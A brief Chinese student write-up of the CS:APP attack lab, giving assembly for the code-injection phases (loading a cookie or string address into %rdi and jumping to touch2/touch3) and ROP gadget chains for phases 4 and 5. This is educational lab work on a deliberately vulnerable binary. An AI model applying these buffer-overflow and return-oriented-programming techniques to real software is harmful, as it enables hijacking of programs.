做不到向大佬那样一串三呜呜呜orz

pwntools问了丛丛佬才知道无法读回显，为了能看到回显我就用pwntools写一个payload然后存进txt文件了

ctarget和rtarget的第二第三关首先要构造出汇编语句然后用objdump -d来看汇编指令对应的字节序列

### phase2

```
汇编语句为
mov $0x59b997fa,%rdi
push $0x4017ec       //touch2的地址
retq
```

### phase3

可以看到touch3在一开头就申请地址了，所以一定会覆盖掉原先的栈地址，要把字符串放在ret后面才不会覆盖，这里还有一个点就是比较的是字符串，所以要用ascii码(掉坑好久)

```
汇编语句为
mov $0x5561dca8,%rdi   //字符串地址
push $0x4018fa         //touch3的地址
ret
```

### phase4

Rop

寻找带有retq的可以利用的字节码，然后通过地址跳转调用

```
汇编代码应为
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

但是没有这样的汇编代码0.0，所以必须得改一下，将cookie存在栈中，将这个地址赋值给rdi寄存器，等到执行touch2的时候就会读取cookie了，也就过了。

所以汇编代码改成

```
pop %rax
ret
cookie
mov %rax,%rdi
ret
```



### phase5

找了好久or2...最后看了看网上给的思路，发现自己实在是太菜了，精心构造栈空间就可以了

```
汇编代码应改为
movq %rsp,%rax
ret
add 0x37,%al
ret
movq %rax,%rdi
ret
```

